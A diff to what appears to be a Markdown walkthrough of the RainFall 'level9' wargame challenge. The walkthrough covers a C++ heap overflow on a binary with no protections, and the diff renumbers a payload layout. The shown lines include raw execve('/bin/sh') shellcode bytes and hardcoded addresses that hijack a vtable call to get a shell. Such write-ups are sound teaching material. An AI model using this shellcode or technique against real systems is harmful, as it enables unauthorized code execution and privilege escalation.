@@ -24,7 +24,8 @@ level9@localhost's password:
  System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
-level9@RainFall:~$
+level9@RainFall:~$ ls
+level9
 ```
 
 Let's run the program.
@@ -262,8 +263,8 @@ gdb-peda$
 Note that when this crashes, `EIP` is set to `0x6850c031`, which is the first 8 bytes of our shellcode. It turns out that when you're calling an object function in C++, you need to dereference the `EIP` pointer twice. In order to take this into account, we'll move our shellcode over by enough space (4 bytes) to point to the start of it. Here's the new payload composition:
 
 ```
-[ pointer to shellcode ][ shellcode + padding up to 108 bytes ][ pointer to start ]
-[0x804a010] + [\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80] + [random character with 76 bytes] + [0x804a00c]
+1 - [ pointer to shellcode ][ shellcode + padding up to 108 bytes ][ pointer to start ]
+2 - [0x804a010] + [\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80] + [random character with 76 bytes] + [0x804a00c]
 ```
 
 Let's run our exploit.
